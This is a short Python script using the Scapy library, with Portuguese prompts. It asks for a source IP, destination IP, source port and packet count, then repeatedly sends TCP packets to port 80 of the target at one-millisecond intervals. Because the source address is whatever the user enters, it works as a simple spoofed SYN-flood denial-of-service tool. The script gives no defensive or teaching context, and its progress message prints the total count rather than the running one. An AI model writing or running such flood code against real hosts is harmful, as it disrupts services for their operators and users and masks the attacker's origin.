from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP

#-------------------------------------------------------

src = input("IP Origem: ")
dst = input("IP Destino: ")
sport = int(input("Porta de origem: "))

#-------------------------------------------------------

i = 1
packets = int(input("Quantidade de pacotes a enviar: "))

#-------------------------------------------------------

while i <= packets:
    IP1 = IP(src=src, dst=dst)
    TCP1 = TCP(sport=sport, dport=80)
    pkt = IP1 / TCP1
    send(pkt, inter=.001)
    print("Enviado [", packets, "] Pacotes")
    i+=1

#-------------------------------------------------------
